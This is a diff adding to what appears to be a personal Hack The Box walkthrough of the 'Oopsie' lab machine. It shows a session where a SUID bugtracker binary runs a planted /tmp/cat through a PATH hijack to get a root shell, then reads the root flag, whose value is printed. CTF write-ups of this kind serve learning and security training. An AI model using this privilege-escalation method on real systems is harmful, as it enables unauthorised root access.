@@ -208,10 +208,31 @@ cat: /root/reports/12: No such file or directory
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 ```
 - Run the bugtracker, input whatever you want, and it should execute our `/tmp/cat` and give us a root shell.
+```
+robert@oopsie:/usr/bin$ ./bugtracker
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID: x
+x
+---------------
+# whoami
+root
+```
 
+## Root Flag
+```
+# cd /root
+# ls
+reports  root.txt
+# cat root.txt      # PROBLEM: It gave me a root shell... need full path to cat...
+# /bin/cat root.txt
+af13b0bee69f8a877c3faf667f7beacf
+```
 
+![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/b43b938f-b0f5-4261-ac56-ffcc308d7328)
 
-10.129.95.191
+[link to pwn cert](https://www.hackthebox.com/achievement/machine/172151/288)
 
 
 
